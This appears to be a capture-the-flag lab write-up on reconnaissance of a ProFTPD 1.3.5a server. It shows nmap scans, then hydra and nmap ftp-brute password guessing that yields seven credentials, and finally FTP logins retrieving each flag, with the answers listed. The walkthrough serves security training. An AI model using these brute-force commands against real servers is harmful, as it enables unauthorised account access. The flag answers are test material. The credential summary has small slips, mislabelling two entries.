# ProFTP Recon: Basics

### Overview

> In this challenge we will look at the basics of ProFTP server reconnaissance.  Please start the lab and answer the following questions:
>
> **Questions**
>
> 1. What is the version of FTP server?
> 2. Use the username dictionary /usr/share/metasploit-framework/data/wordlists/common\_users.txt and password dictionary /usr/share/metasploit-framework/data/wordlists/unix\_passwords.txt to check if any of these credentials work on the system. List all found credentials.
> 3. Find the password of user “sysadmin” using nmap script.
> 4. Find seven flags hidden on the server.
>
> Instructions:&#x20;
>
> * This lab is dedicated to you! No other users are on this network :)
> * Once you start the lab, you will have access to a root terminal of a Kali instance
> * Your Kali has an interface with IP address 192.X.Y.Z. Run "ip addr" to know the values of X and Y.
> * The Target machine should be located at the IP address 192.X.Y.3.
> * Do not attack the gateway located at IP address 192.X.Y.1



Target: `192.184.96.3`

* Enumeration of [ProFTP](http://www.proftpd.org/) server
* Check for local Ethernet IP address
* Use `nmap` host discovery to scan host within the subnet to find the target machines IP address

```bash
root@attackdefense:~# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
2: ip_vti0@NONE: <NOARP> mtu 1480 qdisc noop state DOWN group default qlen 1000
    link/ipip 0.0.0.0 brd 0.0.0.0
207121: eth0@if207122: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:0a:01:00:03 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 10.1.0.3/16 brd 10.1.255.255 scope global eth0
       valid_lft forever preferred_lft forever
207124: eth1@if207125: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:c0:b8:60:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 192.184.96.2/24 brd 192.184.96.255 scope global eth1
       valid_lft forever preferred_lft forever
       
root@attackdefense:~# nmap -sn 192.184.96.0/24
Starting Nmap 7.70 ( https://nmap.org ) at 2024-06-27 02:17 UTC
Nmap scan report for host-192-184-96-1.newdaybb.net (192.184.96.1)
Host is up (0.000052s latency).
MAC Address: 02:42:29:89:25:1A (Unknown)
Nmap scan report for target-1 (192.184.96.3)
Host is up (0.000012s latency).
MAC Address: 02:42:C0:B8:60:03 (Unknown)
Nmap scan report for attackdefense.com (192.184.96.2)
Host is up.
Nmap done: 256 IP addresses (3 hosts up) scanned in 2.03 seconds
```

> FTP port 21 open

```bash
root@attackdefense:~# nmap 192.184.96.3   
Starting Nmap 7.70 ( https://nmap.org ) at 2024-06-27 02:19 UTC
Nmap scan report for target-1 (192.184.96.3)
Host is up (0.0000090s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
MAC Address: 02:42:C0:B8:60:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.22 seconds
```

> 1. What is the version of FTP server?

**Answer:** `ProFTPD 1.3.5a`

```
Nmap done: 1 IP address (1 host up) scanned in 0.22 seconds
root@attackdefense:~# nmap -sV 192.184.96.3
Starting Nmap 7.70 ( https://nmap.org ) at 2024-06-27 02:19 UTC
Nmap scan report for target-1 (192.184.96.3)
Host is up (0.0000090s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.5a
MAC Address: 02:42:C0:B8:60:03 (Unknown)
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.47 seconds
```

> 2. Use the username dictionary /usr/share/metasploit-framework/data/wordlists/common\_users.txt and password dictionary /usr/share/metasploit-framework/data/wordlists/unix\_passwords.txt to check if any of these credentials work on the system. List all found credentials.

```bash
root@attackdefense:~# hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.184.96.3 ftp
Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-06-27 02:23:34
[DATA] max 16 tasks per 1 server, overall 16 tasks, 7063 login tries (l:7/p:1009), ~442 tries per task
[DATA] attacking ftp://192.184.96.3:21/
[21][ftp] host: 192.184.96.3   login: sysadmin   password: 654321
[21][ftp] host: 192.184.96.3   login: rooty   password: qwerty
[21][ftp] host: 192.184.96.3   login: demo   password: butterfly
[21][ftp] host: 192.184.96.3   login: auditor   password: chocolate
[21][ftp] host: 192.184.96.3   login: anon   password: purple
[21][ftp] host: 192.184.96.3   login: administrator   password: tweety
[21][ftp] host: 192.184.96.3   login: diag   password: tigger
1 of 1 target successfully completed, 7 valid passwords found
[WARNING] Writing restore file because 5 final worker threads did not complete until end.
[ERROR] 5 targets did not resolve or could not be connected
[ERROR] 16 targets did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-06-27 02:24:15
```

3. Find the password of user “sysadmin” using nmap script.

**Answer:** `sysadmin:654321`

```bash
// create a files named users that stored "sysadmin" to import into the namp script

root@attackdefense:~# echo "sysadmin" > users
root@attackdefense:~# ls
README  tools  users  wordlists
root@attackdefense:~# cat users 
sysadmin
```

```bash
root@attackdefense:~# nmap --script ftp-brute --script-args userb=/root/users -p21 192.184.96.3 
Starting Nmap 7.70 ( https://nmap.org ) at 2024-06-27 02:29 UTC

root@attackdefense:~# nmap --script ftp-brute --script-args userdb=/root/users -p21 192.184.96.3 
Starting Nmap 7.70 ( https://nmap.org ) at 2024-06-27 02:29 UTC
Nmap scan report for target-1 (192.184.96.3)
Host is up (0.000045s latency).

PORT   STATE SERVICE
21/tcp open  ftp
| ftp-brute: 
|   Accounts: 
|     sysadmin:654321 - Valid credentials
|_  Statistics: Performed 23 guesses in 6 seconds, average tps: 3.8
MAC Address: 02:42:C0:B8:60:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 5.56 seconds
```

> 4. Find seven flags hidden on the server.

> 📌 Login FTP:
>
> `sysadmin:654321` `rooty:qwerty` `demo:butterfly` `auditor:chocolate` `anon:purple` `cy` `diag:tigger`

<details>

<summary><code>sysadmin:654321</code></summary>

`260ca9dd8a4577fc00b7bd5810298076`

</details>

<details>

<summary><code>rooty:qwerty</code></summary>

`e529a9cea4a728eb9c5828b13b22844c`

</details>

<details>

<summary><code>demo:butterfly</code></summary>

`d6a6bc0db10694a2d90e3a69648f3a03`

</details>

<details>

<summary><code>auditor:chocolate</code></summary>

`098f6bcd4621d373cade4e832627b4f6`

</details>

<details>

<summary><code>anon:purple</code></summary>

`1bc29b36f623ba82aaf6724fd3b16718`

</details>

<details>

<summary><code>anon:purple</code></summary>

`21232f297a57a5a743894a0e4a801fc3`

</details>

<details>

<summary><code>diag:tigger</code></summary>

`12a032ce9179c32a6c7ab397b9d871fa`

</details>

```bash
root@attackdefense:~# ftp 192.184.96.3 
Connected to 192.184.96.3.
220 ProFTPD 1.3.5a Server (AttackDefense-FTP) [::ffff:192.184.96.3]
Name (192.184.96.3:root): sysadmin
331 Password required for sysadmin
Password:
230 User sysadmin logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful
150 Opening ASCII mode data connection for file list
-rw-r--r--   1 0        0              33 Nov 20  2018 secret.txt
226 Transfer complete
ftp> get secret.txt
local: secret.txt remote: secret.txt
200 PORT command successful
150 Opening BINARY mode data connection for secret.txt (33 bytes)
226 Transfer complete
33 bytes received in 0.00 secs (233.5258 kB/s)
ftp> exit
221 Goodbye.
root@attackdefense:~# ls
README  secret.txt  tools  users  wordlists
root@attackdefense:~# cat secret.txt 
260ca9dd8a4577fc00b7bd5810298076
```



```bash
root@attackdefense:~# ftp 192.184.96.3 
Connected to 192.184.96.3.
220 ProFTPD 1.3.5a Server (AttackDefense-FTP) [::ffff:192.184.96.3]
Name (192.184.96.3:root): rooty
331 Password required for rooty
Password:
230 User rooty logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful
150 Opening ASCII mode data connection for file list
-rw-r--r--   1 0        0              33 Nov 20  2018 secret.txt
226 Transfer complete
ftp> get secret.txt 
local: secret.txt remote: secret.txt
200 PORT command successful
150 Opening BINARY mode data connection for secret.txt (33 bytes)
226 Transfer complete
33 bytes received in 0.00 secs (69.3044 kB/s)
ftp> exit
221 Goodbye.
root@attackdefense:~# cat secret.txt 
e529a9cea4a728eb9c5828b13b22844c
```



```bash
root@attackdefense:~# ftp 192.184.96.3 
Connected to 192.184.96.3.
220 ProFTPD 1.3.5a Server (AttackDefense-FTP) [::ffff:192.184.96.3]
Name (192.184.96.3:root): demo   
331 Password required for demo
Password:
230 User demo logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls  
200 PORT command successful
150 Opening ASCII mode data connection for file list
-rw-r--r--   1 0        0              33 Nov 20  2018 secret.txt
226 Transfer complete
ftp> get secret.txt 
local: secret.txt remote: secret.txt
200 PORT command successful
150 Opening BINARY mode data connection for secret.txt (33 bytes)
226 Transfer complete
33 bytes received in 0.00 secs (92.6051 kB/s)
ftp> exit
221 Goodbye.
root@attackdefense:~# cat secret.txt 
d6a6bc0db10694a2d90e3a69648f3a03
```



```bash
root@attackdefense:~# ftp 192.184.96.3 
Connected to 192.184.96.3.
220 ProFTPD 1.3.5a Server (AttackDefense-FTP) [::ffff:192.184.96.3]
Name (192.184.96.3:root): auditor 
331 Password required for auditor
Password:
230 User auditor logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls 
200 PORT command successful
150 Opening ASCII mode data connection for file list
-rw-r--r--   1 0        0              33 Nov 20  2018 secret.txt
226 Transfer complete
ftp> get secret.txt 
local: secret.txt remote: secret.txt
200 PORT command successful
150 Opening BINARY mode data connection for secret.txt (33 bytes)
226 Transfer complete
33 bytes received in 0.00 secs (64.7120 kB/s)
ftp> exit
221 Goodbye.
root@attackdefense:~# cat secret.txt 
098f6bcd4621d373cade4e832627b4f6
```



```bash
root@attackdefense:~# ftp 192.184.96.3 
Connected to 192.184.96.3.
220 ProFTPD 1.3.5a Server (AttackDefense-FTP) [::ffff:192.184.96.3]
Name (192.184.96.3:root): anon
331 Password required for anon
Password:
230 User anon logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful
150 Opening ASCII mode data connection for file list
-rw-r--r--   1 0        0              33 Nov 20  2018 secret.txt
226 Transfer complete
ftp> get secret.txt 
local: secret.txt remote: secret.txt
200 PORT command successful
150 Opening BINARY mode data connection for secret.txt (33 bytes)
226 Transfer complete
33 bytes received in 0.00 secs (72.7462 kB/s)
ftp> exit
221 Goodbye.
root@attackdefense:~# cat secret.txt 
1bc29b36f623ba82aaf6724fd3b16718
```



```bash
root@attackdefense:~# ftp 192.184.96.3 
Connected to 192.184.96.3.
220 ProFTPD 1.3.5a Server (AttackDefense-FTP) [::ffff:192.184.96.3]
Name (192.184.96.3:root): administrator
331 Password required for administrator
Password:
230 User administrator logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful
150 Opening ASCII mode data connection for file list
-rw-r--r--   1 0        0              33 Nov 20  2018 secret.txt
226 Transfer complete
ftp> get secret.txt 
local: secret.txt remote: secret.txt
200 PORT command successful
150 Opening BINARY mode data connection for secret.txt (33 bytes)
226 Transfer complete
33 bytes received in 0.00 secs (85.4816 kB/s)
ftp> exit
221 Goodbye.
root@attackdefense:~# cat secret.txt 
21232f297a57a5a743894a0e4a801fc3
```



```bash
root@attackdefense:~# ftp 192.184.96.3 
Connected to 192.184.96.3.
220 ProFTPD 1.3.5a Server (AttackDefense-FTP) [::ffff:192.184.96.3]
Name (192.184.96.3:root): diag 
331 Password required for diag
Password:
230 User diag logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful
150 Opening ASCII mode data connection for file list
-rw-r--r--   1 0        0              33 Nov 20  2018 secret.txt
226 Transfer complete
ftp> get secret.txt 
local: secret.txt remote: secret.txt
200 PORT command successful
150 Opening BINARY mode data connection for secret.txt (33 bytes)
226 Transfer complete
33 bytes received in 0.00 secs (60.1242 kB/s)
ftp> exit
221 Goodbye.
root@attackdefense:~# cat secret.txt 
12a032ce9179c32a6c7ab397b9d871fa
```









